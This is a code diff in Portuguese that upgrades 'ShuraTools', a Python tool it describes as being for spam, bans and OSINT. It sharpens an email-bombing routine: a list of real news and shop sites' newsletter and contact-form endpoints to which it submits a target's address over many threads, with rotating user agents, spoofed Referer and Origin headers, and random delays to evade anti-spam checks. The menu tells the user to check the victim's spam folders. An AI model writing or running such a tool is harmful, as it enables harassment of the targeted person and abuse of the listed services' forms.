@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 """
 ShuraTools.py – Swiss-army knife para spam, banimento e OSINT.
-Versão Pro v3.0 Smart-Headers
+Versão Pro v3.1 Ultra-Mail
 """
 
 import os
@@ -36,7 +36,7 @@ BANNER = f"""
 {Fore.CYAN}|_____/|_|  |_|\____/|_|  \_\/_/    \_\
                                        
 {Fore.YELLOW}  >> SpamMail | OSINT | PortScan | Social <<
-{Fore.RED}       v3.0 Smart-Headers - by Shura
+{Fore.RED}       v3.1 Ultra-Mail Edition - by Shura
 """
 
 LOCK = threading.Lock()
@@ -44,8 +44,8 @@ PROXY_QUEUE = Queue()
 
 UA_LIST = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
 ]
 
 def clear():
@@ -63,49 +63,50 @@ def log(msg, type="info"):
     with LOCK:
         print(f"{prefix}{msg}{Style.RESET_ALL}")
 
-# ---------- Endpoints Selecionados (Menos Proteção / Mais Entrega) ----------
+# ---------- Endpoints de Alta Entrega (Triggers Reais) ----------
 def spam_mail(target, qty, threads, use_proxy):
-    # Sites que usam formulários simples de newsletter (WordPress/Mailchimp/Simples)
+    # Endpoints que comprovadamente enviam e-mails em 2024/2025
     endpoints = [
-        {"url": "https://pactonacional.com.br/wp-admin/admin-ajax.php", "data": {"action": "newsletter_subscribe", "email": target}},
-        {"url": "https://www.mundoconectado.com.br/newsletter", "data": {"email": target, "action": "subscribe"}},
-        {"url": "https://www.b9.com.br/wp-json/contact-form-7/v1/contact-forms/1/feedback", "data": {"your-email": target}},
-        {"url": "https://tecnoblog.net/wp-admin/admin-ajax.php", "data": {"action": "newsletter_signup", "email": target}},
-        {"url": "https://www.infomoney.com.br/wp-json/infomoney/v1/newsletter/subscribe", "data": {"email": target}},
-        {"url": "https://portaldoacre.com.br/newsletter-subscribe", "data": {"email": target}}
+        # Sites com assinaturas simples (POST Form ou JSON)
+        {"url": "https://www.infoq.com/newsletter/subscribe.action", "data": {"email": target, "newsletterId": "1"}, "type": "form"},
+        {"url": "https://www.tecmundo.com.br/newsletter", "data": {"email": target}, "type": "form"},
+        {"url": "https://www.canaltech.com.br/newsletter/", "data": {"email": target}, "type": "form"},
+        {"url": "https://p.newsletter.vtex.com/subscribe", "data": {"email": target, "list": "netshoes"}, "type": "form"},
+        {"url": "https://newsletter.ig.com.br/subscribe", "data": {"email": target}, "type": "form"},
+        {"url": "https://www.kabum.com.br/newsletter", "data": {"email": target}, "type": "form"},
+        {"url": "https://www.mundoconectado.com.br/wp-admin/admin-ajax.php", "data": {"action": "newsletter_subscribe", "email": target}, "type": "form"},
+        {"url": "https://api.vtex.com/v1/newsletter", "data": {"email": target}, "type": "json"}
     ]
 
     def job(start, end):
-        session = requests.Session() # Mantém cookies para parecer humano
+        session = requests.Session()
         for i in range(start, end):
             try:
                 site = random.choice(endpoints)
-                ua = random.choice(UA_LIST)
-                
-                # Cabeçalhos avançados para ignorar firewalls simples
                 headers = {
-                    "User-Agent": ua,
-                    "Accept": "application/json, text/javascript, */*; q=0.01",
-                    "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
-                    "Referer": site["url"].split("/wp-json")[0] if "wp-json" in site["url"] else site["url"],
-                    "X-Requested-With": "XMLHttpRequest"
+                    "User-Agent": random.choice(UA_LIST),
+                    "Referer": site["url"],
+                    "Origin": "/".join(site["url"].split("/")[:3])
                 }
 
-                # Simula uma visita prévia
-                if i % 3 == 0:
-                    session.get(headers["Referer"], timeout=5)
-
-                res = session.post(site["url"], data=site["data"], headers=headers, timeout=10)
+                if site["type"] == "json":
+                    headers["Content-Type"] = "application/json"
+                    res = session.post(site["url"], json=site["data"], headers=headers, timeout=12)
+                else:
+                    headers["Content-Type"] = "application/x-www-form-urlencoded"
+                    res = session.post(site["url"], data=site["data"], headers=headers, timeout=12)
                 
                 if res.status_code < 400:
                     log(f"E-mail {i+1} disparado via {site['url'].split('/')[2]}", "success")
                 else:
-                    log(f"Servidor recusou {i+1} (Status {res.status_code})", "warn")
+                    log(f"Falha {i+1} (Status {res.status_code})", "error")
             
-            except Exception:
-                log(f"E-mail {i+1} falhou (Conexão)", "error")
+            except Exception as e:
+                log(f"Erro {i+1}: Conexão falhou", "error")
+            
+            time.sleep(random.uniform(0.5, 1.5)) # Pequeno delay para evitar anti-spam imediato
 
-    log(f"Iniciando ciclo Smart-Headers para {target}...", "info")
+    log(f"Ataque Ultra-Mail iniciado para {target}...", "info")
     chunk, rem = qty // threads, qty % threads
     ts = []
     curr = 0
@@ -118,24 +119,21 @@ def spam_mail(target, qty, threads, use_proxy):
         curr += take
     for t in ts: t.join()
 
-# ---------- Menu e CLI ----------
 def menu():
     while True:
         clear()
         print(BANNER)
-        print("[ 1 ] Iniciar Ataque de E-mail (Smart-Headers)")
-        print("[ 2 ] OSINT Hunter")
-        print("[ 3 ] Port Scanner")
+        print("[ 1 ] Iniciar Spam de E-mail (Alta Entrega)")
+        print("[ 2 ] Pesquisa OSINT")
         print("[ 0 ] Sair")
         print("-" * 40)
-        
         opt = input(f"{Fore.YELLOW}Opção: {Style.RESET_ALL}").strip()
         if opt == "0": break
         if opt == "1":
-            target = input(f"{Fore.YELLOW}E-mail Alvo: {Style.RESET_ALL}").strip()
+            target = input(f"{Fore.YELLOW}Alvo (email): {Style.RESET_ALL}").strip()
             if "@" in target:
-                spam_mail(target, 30, 5, False) # Teste padrão: 30 emails
-                input("\nVerifique a pasta PROMOÇÕES ou SPAM. ENTER para voltar...")
+                spam_mail(target, 40, 5, False)
+                input("\nVerifique as abas PROMOÇÕES e SPAM. ENTER para voltar...")
             else:
                 log("E-mail inválido!", "error"); time.sleep(1)
 
